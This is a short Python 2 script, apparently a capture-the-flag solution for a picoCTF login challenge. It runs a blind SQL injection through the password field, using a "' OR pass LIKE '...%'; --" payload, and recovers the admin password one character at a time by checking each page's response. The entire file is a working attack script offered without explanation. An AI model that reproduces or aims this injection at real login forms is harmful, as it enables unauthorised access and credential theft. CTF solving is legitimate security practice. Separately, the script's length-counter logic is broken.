import requests, sys, time

def natas15(query):
  status=0
  while status != 200:
    try:
      r = requests.post("http://shell2017.picoctf.com:40788/", data={'username':'admin','password':query}, timeout=1)
      status = r.status_code
    except Exception:
      time.sleep(1)
      continue
  return r.text

def parse(data):
  keyword = "<strong>"
  start = data.index(keyword) + len(keyword)
  keyword = "</strong>"
  end = data.index(keyword)
  return data[start:end]

allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ _!"#$&()*+`-./:;<=>?@[]\\^{}|~'
queryStart = "' OR pass LIKE '"
queryEnd = "%'; --"
password = ""

isFound = True
for i in range(63):
  if isFound == False:
    i -= 1
  else:
    isFound = False
  sys.stdout.write("Length "+str(i)+": ")
  sys.stdout.flush()
  for c in allChars:
    html = natas15(queryStart + password + c + queryEnd)
    message = parse(html)
    sys.stdout.write(c)
    sys.stdout.flush()
    #print message
    if "Login Functionality" in message:
      password += c
      isFound = True
      sys.stdout.write('\n')
      break

print password
